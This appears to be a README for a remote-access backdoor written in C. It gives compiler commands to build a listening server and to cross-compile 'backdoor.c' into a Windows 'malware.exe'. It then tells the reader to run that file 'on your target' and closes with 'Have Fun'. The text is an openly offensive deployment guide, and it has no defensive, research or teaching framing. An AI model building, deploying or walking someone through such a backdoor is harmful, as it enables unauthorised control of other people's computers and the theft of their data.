# BackDoor in C
``
Compile the server 
``
```
gcc server.c -o server 
```
then run it on your PC ./server
 
 you can make the backdoor as exe 
 ```
 i686-w64-mingw32-gcc -o malware.exe backdoor.c -lwsock32 -lwininet
 ```
 the run it on your target
 
 Have Fun.
